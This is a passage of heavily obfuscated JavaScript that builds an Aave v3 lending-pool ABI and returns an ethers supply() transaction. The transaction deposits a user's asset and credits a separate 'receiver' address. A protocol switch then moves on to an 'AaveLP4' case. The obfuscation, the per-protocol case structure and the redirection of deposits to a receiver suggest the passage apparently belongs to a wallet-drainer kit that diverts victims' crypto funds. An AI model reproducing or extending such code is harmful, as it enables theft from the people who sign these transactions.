          const _0x570d9f = {
            indexed: true,
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x36d355 = {
            indexed: true,
            internalType: 'address',
            name: "repayer",
            type: "address"
          };
          const _0x45e7d4 = {
            indexed: false,
            internalType: "uint256",
            name: "amount",
            type: 'uint256'
          };
          const _0xf6a494 = {
            indexed: false,
            internalType: "bool",
            name: "useATokens",
            type: "bool"
          };
          const _0x282538 = {
            anonymous: false,
            inputs: [_0x34d275, _0x570d9f, _0x36d355, _0x45e7d4, _0xf6a494],
            name: 'Repay',
            type: 'event'
          };
          const _0x5d38a6 = {
            indexed: true,
            internalType: "address",
            name: "reserve",
            type: "address"
          };
          const _0x1c6584 = {
            indexed: false,
            internalType: 'uint256',
            name: "liquidityRate",
            type: 'uint256'
          };
          const _0x322f9c = {
            indexed: false,
            internalType: 'uint256',
            name: "stableBorrowRate",
            type: 'uint256'
          };
          const _0x648583 = {
            indexed: false,
            internalType: 'uint256',
            name: "variableBorrowRate",
            type: 'uint256'
          };
          const _0x3adf4d = {
            indexed: false,
            internalType: 'uint256',
            name: "liquidityIndex",
            type: "uint256"
          };
          const _0x56ee2e = {
            indexed: false,
            internalType: 'uint256',
            name: "variableBorrowIndex",
            type: 'uint256'
          };
          const _0x35b455 = {
            anonymous: false,
            inputs: [_0x5d38a6, _0x1c6584, _0x322f9c, _0x648583, _0x3adf4d, _0x56ee2e],
            name: "ReserveDataUpdated",
            type: "event"
          };
          const _0x313ad8 = {
            indexed: true,
            internalType: "address",
            name: "reserve",
            type: "address"
          };
          const _0xd68f38 = {
            indexed: true,
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0xe9c80 = {
            anonymous: false,
            inputs: [_0x313ad8, _0xd68f38],
            name: "ReserveUsedAsCollateralDisabled",
            type: 'event'
          };
          const _0x3408d4 = {
            indexed: true,
            internalType: 'address',
            name: 'reserve',
            type: "address"
          };
          const _0x2caf49 = {
            indexed: true,
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x144064 = {
            anonymous: false,
            inputs: [_0x3408d4, _0x2caf49],
            name: "ReserveUsedAsCollateralEnabled",
            type: "event"
          };
          const _0x47e3f5 = {
            indexed: true,
            internalType: "address",
            name: "reserve",
            type: "address"
          };
          const _0x5c6824 = {
            indexed: false,
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x2eaa9a = {
            indexed: true,
            internalType: "address",
            name: "onBehalfOf",
            type: "address"
          };
          const _0x25942c = {
            indexed: false,
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x2ddd19 = {
            indexed: true,
            internalType: "uint16",
            name: "referralCode",
            type: "uint16"
          };
          const _0x48e6de = {
            anonymous: false,
            inputs: [_0x47e3f5, _0x5c6824, _0x2eaa9a, _0x25942c, _0x2ddd19],
            name: "Supply",
            type: 'event'
          };
          const _0x3a7367 = {
            indexed: true,
            internalType: 'address',
            name: "reserve",
            type: "address"
          };
          const _0x470296 = {
            indexed: true,
            internalType: "address",
            name: "user",
            type: 'address'
          };
          const _0x15c3e7 = {
            indexed: false,
            internalType: "enum DataTypes.InterestRateMode",
            name: "interestRateMode",
            type: "uint8"
          };
          const _0x36e3b8 = {
            anonymous: false,
            inputs: [_0x3a7367, _0x470296, _0x15c3e7],
            name: "SwapBorrowRateMode",
            type: 'event'
          };
          const _0x8e173 = {
            indexed: true,
            internalType: "address",
            name: "user",
            type: 'address'
          };
          const _0xfa778 = {
            indexed: false,
            internalType: "uint8",
            name: "categoryId",
            type: "uint8"
          };
          const _0x2203c3 = {
            anonymous: false,
            inputs: [_0x8e173, _0xfa778],
            name: "UserEModeSet",
            type: 'event'
          };
          const _0x275ca3 = {
            indexed: true,
            internalType: "address",
            name: "reserve",
            type: "address"
          };
          const _0x6a2fc0 = {
            indexed: true,
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x581aa3 = {
            indexed: true,
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x368583 = {
            indexed: false,
            internalType: 'uint256',
            name: "amount",
            type: "uint256"
          };
          const _0x57e484 = {
            anonymous: false,
            inputs: [_0x275ca3, _0x6a2fc0, _0x581aa3, _0x368583],
            name: "Withdraw",
            type: 'event'
          };
          const _0x2a8f0c = {
            internalType: "contract IPoolAddressesProvider",
            name: '',
            type: "address"
          };
          const _0x561fe4 = {
            inputs: [],
            name: "ADDRESSES_PROVIDER",
            outputs: [_0x2a8f0c],
            stateMutability: "view",
            type: "function"
          };
          const _0x5bb4ad = {
            internalType: 'uint256',
            name: '',
            type: "uint256"
          };
          const _0x49c699 = {
            inputs: [],
            name: "BRIDGE_PROTOCOL_FEE",
            outputs: [_0x5bb4ad],
            stateMutability: "view",
            type: "function"
          };
          const _0x4da65c = {
            internalType: "uint128",
            name: '',
            type: "uint128"
          };
          const _0x302fa5 = {
            inputs: [],
            name: "FLASHLOAN_PREMIUM_TOTAL",
            outputs: [_0x4da65c],
            stateMutability: "view",
            type: "function"
          };
          const _0x1f18e1 = {
            inputs: [],
            name: "FLASHLOAN_PREMIUM_TO_PROTOCOL",
            outputs: [{
              'internalType': 'uint128',
              'name': '',
              'type': "uint128"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x577d7d = {
            inputs: [],
            name: "MAX_NUMBER_RESERVES",
            outputs: [{
              'internalType': "uint16",
              'name': '',
              'type': "uint16"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x2525a0 = {
            inputs: [],
            name: "MAX_STABLE_RATE_BORROW_SIZE_PERCENT",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x4dc746 = {
            inputs: [],
            name: "POOL_REVISION",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x523831 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x3b0dda = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x4ef51c = {
            internalType: 'uint256',
            name: 'fee',
            type: 'uint256'
          };
          const _0xe3e231 = {
            inputs: [_0x523831, _0x3b0dda, _0x4ef51c],
            name: "backUnbacked",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2b83a1 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x51296b = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x897725 = {
            internalType: "uint256",
            name: "interestRateMode",
            type: 'uint256'
          };
          const _0x3c395c = {
            internalType: "uint16",
            name: "referralCode",
            type: "uint16"
          };
          const _0x28341a = {
            internalType: "address",
            name: "onBehalfOf",
            type: "address"
          };
          const _0x471c94 = {
            inputs: [_0x2b83a1, _0x51296b, _0x897725, _0x3c395c, _0x28341a],
            name: 'borrow',
            outputs: [],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x2658ce = {
            internalType: "uint8",
            name: 'id',
            type: "uint8"
          };
          const _0x3d9bc7 = {
            internalType: "uint16",
            name: "ltv",
            type: "uint16"
          };
          const _0x2ccb60 = {
            internalType: "uint16",
            name: "liquidationThreshold",
            type: "uint16"
          };
          const _0x2afa52 = {
            internalType: "uint16",
            name: "liquidationBonus",
            type: "uint16"
          };
          const _0x5cf932 = {
            internalType: "address",
            name: "priceSource",
            type: "address"
          };
          const _0x1d0dff = {
            internalType: "string",
            name: "label",
            type: "string"
          };
          const _0x804e38 = {
            components: [_0x3d9bc7, _0x2ccb60, _0x2afa52, _0x5cf932, _0x1d0dff],
            internalType: "struct DataTypes.EModeCategory",
            name: 'category',
            type: "tuple"
          };
          const _0x14a9c9 = {
            inputs: [_0x2658ce, _0x804e38],
            name: "configureEModeCategory",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4bc847 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0xfb8c3a = {
            internalType: "uint256",
            name: "amount",
            type: 'uint256'
          };
          const _0x3356d2 = {
            internalType: "address",
            name: "onBehalfOf",
            type: "address"
          };
          const _0x818b56 = {
            internalType: "uint16",
            name: "referralCode",
            type: "uint16"
          };
          const _0x46b59c = {
            inputs: [_0x4bc847, _0xfb8c3a, _0x3356d2, _0x818b56],
            name: "deposit",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x245b1f = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x4ca618 = {
            inputs: [_0x245b1f],
            name: "dropReserve",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x47d5d3 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x80cba4 = {
            internalType: "address",
            name: "from",
            type: "address"
          };
          const _0x23157b = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x3a35cf = {
            internalType: "uint256",
            name: "amount",
            type: "uint256"
          };
          const _0x2cc2c3 = {
            internalType: 'uint256',
            name: "balanceFromBefore",
            type: 'uint256'
          };
          const _0x15d68c = {
            internalType: 'uint256',
            name: "balanceToBefore",
            type: 'uint256'
          };
          const _0x41c027 = {
            inputs: [_0x47d5d3, _0x80cba4, _0x23157b, _0x3a35cf, _0x2cc2c3, _0x15d68c],
            name: "finalizeTransfer",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4cfcc8 = {
            internalType: "address",
            name: "receiverAddress",
            type: "address"
          };
          const _0x491781 = {
            internalType: "address[]",
            name: "assets",
            type: "address[]"
          };
          const _0x38f033 = {
            internalType: 'uint256[]',
            name: "amounts",
            type: 'uint256[]'
          };
          const _0x4a38ab = {
            internalType: 'uint256[]',
            name: "interestRateModes",
            type: 'uint256[]'
          };
          const _0x4c333d = {
            internalType: "address",
            name: "onBehalfOf",
            type: "address"
          };
          const _0x4977f3 = {
            internalType: "bytes",
            name: "params",
            type: 'bytes'
          };
          const _0x1a69c3 = {
            internalType: "uint16",
            name: "referralCode",
            type: "uint16"
          };
          const _0xb258af = {
            inputs: [_0x4cfcc8, _0x491781, _0x38f033, _0x4a38ab, _0x4c333d, _0x4977f3, _0x1a69c3],
            name: "flashLoan",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x31013a = {
            internalType: "address",
            name: "receiverAddress",
            type: "address"
          };
          const _0x245de1 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0xbe9e02 = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x346863 = {
            internalType: "bytes",
            name: 'params',
            type: "bytes"
          };
          const _0x51eae5 = {
            internalType: 'uint16',
            name: "referralCode",
            type: "uint16"
          };
          const _0x4e7c34 = {
            inputs: [_0x31013a, _0x245de1, _0xbe9e02, _0x346863, _0x51eae5],
            name: "flashLoanSimple",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3e70b5 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x5d210f = {
            inputs: [_0x3e70b5],
            name: "getConfiguration",
            outputs: [{
              'components': [{
                'internalType': 'uint256',
                'name': "data",
                'type': 'uint256'
              }],
              'internalType': "struct DataTypes.ReserveConfigurationMap",
              'name': '',
              'type': "tuple"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x366594 = {
            internalType: "uint8",
            name: 'id',
            type: "uint8"
          };
          const _0x51ee07 = {
            internalType: "uint16",
            name: "liquidationBonus",
            type: "uint16"
          };
          const _0x467508 = {
            inputs: [_0x366594],
            name: "getEModeCategoryData",
            outputs: [{
              'components': [{
                'internalType': "uint16",
                'name': "ltv",
                'type': "uint16"
              }, {
                'internalType': "uint16",
                'name': "liquidationThreshold",
                'type': "uint16"
              }, _0x51ee07, {
                'internalType': "address",
                'name': "priceSource",
                'type': "address"
              }, {
                'internalType': "string",
                'name': "label",
                'type': "string"
              }],
              'internalType': "struct DataTypes.EModeCategory",
              'name': '',
              'type': "tuple"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x317c90 = {
            internalType: "uint16",
            name: 'id',
            type: "uint16"
          };
          const _0x351555 = {
            inputs: [_0x317c90],
            name: "getReserveAddressById",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x40e657 = {
            internalType: "address",
            name: "asset",
            type: 'address'
          };
          const _0x9315f = {
            internalType: 'uint256',
            name: "data",
            type: "uint256"
          };
          const _0x1ee3a6 = {
            components: [_0x9315f],
            internalType: "struct DataTypes.ReserveConfigurationMap",
            name: "configuration",
            type: "tuple"
          };
          const _0x34dfad = {
            internalType: "uint128",
            name: "liquidityIndex",
            type: "uint128"
          };
          const _0xff3582 = {
            internalType: "uint128",
            name: "currentLiquidityRate",
            type: "uint128"
          };
          const _0x74a18f = {
            internalType: "uint128",
            name: "variableBorrowIndex",
            type: "uint128"
          };
          const _0x202fb2 = {
            internalType: "uint128",
            name: "currentVariableBorrowRate",
            type: "uint128"
          };
          const _0x27fa0d = {
            internalType: "uint128",
            name: "currentStableBorrowRate",
            type: "uint128"
          };
          const _0x4ce951 = {
            internalType: "uint40",
            name: "lastUpdateTimestamp",
            type: "uint40"
          };
          const _0x57bad1 = {
            internalType: "uint16",
            name: 'id',
            type: "uint16"
          };
          const _0x5e7bf8 = {
            internalType: "address",
            name: "aTokenAddress",
            type: "address"
          };
          const _0x557d1f = {
            internalType: "address",
            name: "stableDebtTokenAddress",
            type: 'address'
          };
          const _0x15f847 = {
            internalType: "address",
            name: "variableDebtTokenAddress",
            type: "address"
          };
          const _0x31dd88 = {
            internalType: "address",
            name: "interestRateStrategyAddress",
            type: 'address'
          };
          const _0x2810f5 = {
            internalType: "uint128",
            name: "accruedToTreasury",
            type: "uint128"
          };
          const _0x2f5e18 = {
            internalType: "uint128",
            name: "unbacked",
            type: "uint128"
          };
          const _0x48cb4f = {
            internalType: "uint128",
            name: "isolationModeTotalDebt",
            type: "uint128"
          };
          const _0x3dad33 = {
            components: [_0x1ee3a6, _0x34dfad, _0xff3582, _0x74a18f, _0x202fb2, _0x27fa0d, _0x4ce951, _0x57bad1, _0x5e7bf8, _0x557d1f, _0x15f847, _0x31dd88, _0x2810f5, _0x2f5e18, _0x48cb4f],
            internalType: "struct DataTypes.ReserveData",
            name: '',
            type: "tuple"
          };
          const _0x3d75fa = {
            inputs: [_0x40e657],
            name: "getReserveData",
            outputs: [_0x3dad33],
            stateMutability: "view",
            type: "function"
          };
          const _0x1d0d6b = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x254f0c = {
            inputs: [_0x1d0d6b],
            name: "getReserveNormalizedIncome",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x3e19ca = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x9abe14 = {
            inputs: [_0x3e19ca],
            name: "getReserveNormalizedVariableDebt",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x5dafcd = {
            inputs: [],
            name: "getReservesList",
            outputs: [{
              'internalType': "address[]",
              'name': '',
              'type': "address[]"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x4a52af = {
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x24bab6 = {
            internalType: "uint256",
            name: "ltv",
            type: "uint256"
          };
          const _0x216954 = {
            inputs: [_0x4a52af],
            name: "getUserAccountData",
            outputs: [{
              'internalType': 'uint256',
              'name': "totalCollateralBase",
              'type': 'uint256'
            }, {
              'internalType': "uint256",
              'name': "totalDebtBase",
              'type': 'uint256'
            }, {
              'internalType': "uint256",
              'name': "availableBorrowsBase",
              'type': "uint256"
            }, {
              'internalType': 'uint256',
              'name': "currentLiquidationThreshold",
              'type': 'uint256'
            }, _0x24bab6, {
              'internalType': 'uint256',
              'name': "healthFactor",
              'type': 'uint256'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0xe626a5 = {
            internalType: "address",
            name: 'user',
            type: "address"
          };
          const _0x28410b = {
            inputs: [_0xe626a5],
            name: "getUserConfiguration",
            outputs: [{
              'components': [{
                'internalType': 'uint256',
                'name': "data",
                'type': 'uint256'
              }],
              'internalType': "struct DataTypes.UserConfigurationMap",
              'name': '',
              'type': "tuple"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x3b6074 = {
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x1c988d = {
            inputs: [_0x3b6074],
            name: "getUserEMode",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x80dc1f = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x551a03 = {
            internalType: "address",
            name: "aTokenAddress",
            type: "address"
          };
          const _0x4880bb = {
            internalType: "address",
            name: "stableDebtAddress",
            type: "address"
          };
          const _0x21a38d = {
            internalType: 'address',
            name: "variableDebtAddress",
            type: "address"
          };
          const _0x2f0956 = {
            internalType: "address",
            name: "interestRateStrategyAddress",
            type: "address"
          };
          const _0x407ad4 = {
            inputs: [_0x80dc1f, _0x551a03, _0x4880bb, _0x21a38d, _0x2f0956],
            name: "initReserve",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x18c533 = {
            internalType: "contract IPoolAddressesProvider",
            name: "provider",
            type: "address"
          };
          const _0x335fc1 = {
            inputs: [_0x18c533],
            name: "initialize",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x5a81ab = {
            internalType: "address",
            name: "collateralAsset",
            type: "address"
          };
          const _0x4423e5 = {
            internalType: "address",
            name: 'debtAsset',
            type: "address"
          };
          const _0x579d01 = {
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x1bc91 = {
            internalType: "uint256",
            name: "debtToCover",
            type: 'uint256'
          };
          const _0x4f4d26 = {
            internalType: 'bool',
            name: "receiveAToken",
            type: "bool"
          };
          const _0x1cbda0 = {
            inputs: [_0x5a81ab, _0x4423e5, _0x579d01, _0x1bc91, _0x4f4d26],
            name: "liquidationCall",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x5ceb46 = {
            internalType: "address[]",
            name: "assets",
            type: "address[]"
          };
          const _0x1b5f71 = {
            inputs: [_0x5ceb46],
            name: "mintToTreasury",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x54c691 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x224795 = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x4ba145 = {
            internalType: "address",
            name: "onBehalfOf",
            type: "address"
          };
          const _0x6d72b7 = {
            internalType: "uint16",
            name: "referralCode",
            type: "uint16"
          };
          const _0x2af153 = {
            inputs: [_0x54c691, _0x224795, _0x4ba145, _0x6d72b7],
            name: "mintUnbacked",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x103f40 = {
            internalType: "address",
            name: 'asset',
            type: "address"
          };
          const _0x5ba2c1 = {
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x38a2c4 = {
            inputs: [_0x103f40, _0x5ba2c1],
            name: "rebalanceStableBorrowRate",
            outputs: [],
            stateMutability: 'nonpayable',
            type: "function"
          };
          const _0x16d6c3 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x52f906 = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x3648a9 = {
            internalType: 'uint256',
            name: "interestRateMode",
            type: 'uint256'
          };
          const _0x37e4d2 = {
            internalType: "address",
            name: "onBehalfOf",
            type: "address"
          };
          const _0x6099b9 = {
            internalType: 'uint256',
            name: '',
            type: 'uint256'
          };
          const _0x49aaa8 = {
            inputs: [_0x16d6c3, _0x52f906, _0x3648a9, _0x37e4d2],
            name: "repay",
            outputs: [_0x6099b9],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x725b1f = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x43df75 = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x1b9e5a = {
            internalType: 'uint256',
            name: "interestRateMode",
            type: 'uint256'
          };
          const _0x4e75b6 = {
            inputs: [_0x725b1f, _0x43df75, _0x1b9e5a],
            name: "repayWithATokens",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x26f235 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x20cbe7 = {
            internalType: 'uint256',
            name: "amount",
            type: "uint256"
          };
          const _0x230504 = {
            internalType: 'uint256',
            name: "interestRateMode",
            type: 'uint256'
          };
          const _0xbd7f28 = {
            internalType: "address",
            name: "onBehalfOf",
            type: "address"
          };
          const _0x5892cc = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x158531 = {
            internalType: "uint8",
            name: 'permitV',
            type: "uint8"
          };
          const _0xf02c93 = {
            internalType: "bytes32",
            name: 'permitR',
            type: "bytes32"
          };
          const _0x4a4ec4 = {
            internalType: "bytes32",
            name: "permitS",
            type: "bytes32"
          };
          const _0x698b30 = {
            inputs: [_0x26f235, _0x20cbe7, _0x230504, _0xbd7f28, _0x5892cc, _0x158531, _0xf02c93, _0x4a4ec4],
            name: "repayWithPermit",
            outputs: [{
              'internalType': "uint256",
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x37a84a = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x3c092a = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x92edf3 = {
            internalType: 'uint256',
            name: 'amount',
            type: 'uint256'
          };
          const _0x4f02d5 = {
            inputs: [_0x37a84a, _0x3c092a, _0x92edf3],
            name: "rescueTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0xec746d = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x284c33 = {
            inputs: [_0xec746d],
            name: "resetIsolationModeTotalDebt",
            outputs: [],
            stateMutability: 'nonpayable',
            type: "function"
          };
          const _0x46165f = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x1f8450 = {
            internalType: 'uint256',
            name: "data",
            type: 'uint256'
          };
          const _0x322bcc = {
            components: [_0x1f8450],
            internalType: "struct DataTypes.ReserveConfigurationMap",
            name: "configuration",
            type: "tuple"
          };
          const _0x2fa06f = {
            inputs: [_0x46165f, _0x322bcc],
            name: "setConfiguration",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x51dd01 = {
            internalType: 'address',
            name: "asset",
            type: "address"
          };
          const _0x440a4a = {
            internalType: "address",
            name: "rateStrategyAddress",
            type: "address"
          };
          const _0x48c66d = {
            inputs: [_0x51dd01, _0x440a4a],
            name: "setReserveInterestRateStrategyAddress",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2f47f1 = {
            internalType: "uint8",
            name: "categoryId",
            type: "uint8"
          };
          const _0x445126 = {
            inputs: [_0x2f47f1],
            name: "setUserEMode",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x47eb04 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0xca4f35 = {
            internalType: "bool",
            name: "useAsCollateral",
            type: "bool"
          };
          const _0x1dd839 = {
            inputs: [_0x47eb04, _0xca4f35],
            name: "setUserUseReserveAsCollateral",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x32b85d = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x2400ba = {
            internalType: "uint256",
            name: "amount",
            type: 'uint256'
          };
          const _0x15ddd3 = {
            internalType: "address",
            name: "onBehalfOf",
            type: "address"
          };
          const _0x3a7f09 = {
            internalType: "uint16",
            name: "referralCode",
            type: "uint16"
          };
          const _0x27b059 = {
            inputs: [_0x32b85d, _0x2400ba, _0x15ddd3, _0x3a7f09],
            name: 'supply',
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4b24b0 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x1c8337 = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x3a68a6 = {
            internalType: "address",
            name: "onBehalfOf",
            type: "address"
          };
          const _0x1bb05b = {
            internalType: "uint16",
            name: "referralCode",
            type: "uint16"
          };
          const _0x4033ca = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x26cf3f = {
            internalType: "uint8",
            name: 'permitV',
            type: "uint8"
          };
          const _0x49a9b9 = {
            internalType: "bytes32",
            name: 'permitR',
            type: "bytes32"
          };
          const _0x34ea78 = {
            internalType: "bytes32",
            name: "permitS",
            type: "bytes32"
          };
          const _0x16e458 = {
            inputs: [_0x4b24b0, _0x1c8337, _0x3a68a6, _0x1bb05b, _0x4033ca, _0x26cf3f, _0x49a9b9, _0x34ea78],
            name: "supplyWithPermit",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0xa62a9b = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x31aa52 = {
            internalType: 'uint256',
            name: "interestRateMode",
            type: 'uint256'
          };
          const _0xcc3f64 = {
            inputs: [_0xa62a9b, _0x31aa52],
            name: "swapBorrowRateMode",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x5d6b1f = {
            internalType: 'uint256',
            name: "protocolFee",
            type: "uint256"
          };
          const _0x2a70f1 = {
            inputs: [_0x5d6b1f],
            name: "updateBridgeProtocolFee",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x218853 = {
            internalType: "uint128",
            name: "flashLoanPremiumTotal",
            type: "uint128"
          };
          const _0x40ce0b = {
            internalType: "uint128",
            name: "flashLoanPremiumToProtocol",
            type: "uint128"
          };
          const _0x2839a5 = {
            inputs: [_0x218853, _0x40ce0b],
            name: "updateFlashloanPremiums",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4634ea = {
            internalType: "address",
            name: 'asset',
            type: "address"
          };
          const _0x8eca9e = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x5e8f27 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x205abc = {
            inputs: [_0x4634ea, _0x8eca9e, _0x5e8f27],
            name: 'withdraw',
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          let _0x279ec1 = [_0x371572, _0x591c52, _0x8ff1cb, _0x32f664, _0x1290f4, _0x58c70f, _0x452180, _0x123df3, _0x5598bc, _0x282538, _0x35b455, _0xe9c80, _0x144064, _0x48e6de, _0x36e3b8, _0x2203c3, _0x57e484, _0x561fe4, _0x49c699, _0x302fa5, _0x1f18e1, _0x577d7d, _0x2525a0, _0x4dc746, _0xe3e231, _0x471c94, _0x14a9c9, _0x46b59c, _0x4ca618, _0x41c027, _0xb258af, _0x4e7c34, _0x5d210f, _0x467508, _0x351555, _0x3d75fa, _0x254f0c, _0x9abe14, _0x5dafcd, _0x216954, _0x28410b, _0x1c988d, _0x407ad4, _0x335fc1, _0x1cbda0, _0x1b5f71, _0x2af153, _0x38a2c4, _0x49aaa8, _0x4e75b6, _0x698b30, _0x4f02d5, _0x284c33, _0x2fa06f, _0x48c66d, _0x445126, _0x1dd839, _0x27b059, _0x16e458, _0xcc3f64, _0x2a70f1, _0x2839a5, _0x205abc];
          let _0x54654a = new ethers.Contract(_0x3941f8, _0x279ec1, _0xab3127);
          return [_0x54654a.supply(_0x2a18aa.asset.token, _0x2a18aa.asset.amount, this.receiver, 0), ''];
        }
      case "AaveLP4":
        {
          const _0x592638 = {
            inputs: [],
            name: "BorrowNotPaused",
            type: "error"
          };
          const _0x186b5c = {
            inputs: [],
            name: "ExceedsMaxBasisPoints",
            type: "error"
          };
          const _0x1812ee = {
            inputs: [],
            name: "MarketAlreadyCreated",
            type: "error"
          };
          const _0xa84454 = {
            inputs: [],
            name: "MarketIsDeprecated",
            type: "error"
          };
          const _0x470a84 = {
            inputs: [],
            name: "MarketIsNotListedOnAave",
            type: "error"
          };
          const _0x4fca44 = {
            inputs: [],
            name: "MarketNotCreated",
            type: "error"
          };
          const _0x33a8f8 = {
            inputs: [],
            name: "MaxNumberOfMarkets",
            type: "error"
          };
          const _0x3b7c0b = {
            inputs: [],
            name: "MaxSortedUsersCannotBeZero",
            type: "error"
          };
          const _0x175ed8 = {
            inputs: [],
            name: "ZeroAddress",
            type: "error"
          };
          const _0x1048ba = {
            internalType: "uint64",
            name: 'supply',
            type: "uint64"
          };
          const _0x4384f9 = {
            internalType: "uint64",
            name: 'borrow',
            type: "uint64"
          };
          const _0x5175c1 = {
            internalType: "uint64",
            name: 'withdraw',
            type: "uint64"
          };
          const _0x18650f = {
            internalType: "uint64",
            name: 'repay',
            type: "uint64"
          };
          const _0x2d3af1 = {
            components: [_0x1048ba, _0x4384f9, _0x5175c1, _0x18650f],
            indexed: false,
            internalType: "struct Types.MaxGasForMatching",
            name: "_defaultMaxGasForMatching",
            type: "tuple"
          };
          const _0x35e052 = {
            anonymous: false,
            inputs: [_0x2d3af1],
            name: "DefaultMaxGasForMatchingSet",
            type: "event"
          };
          const _0x16b1c9 = {
            indexed: true,
            internalType: "address",
            name: "_entryPositionsManager",
            type: "address"
          };
          const _0x2fc676 = {
            anonymous: false,
            inputs: [_0x16b1c9],
            name: "EntryPositionsManagerSet",
            type: "event"
          };
          const _0x1461ac = {
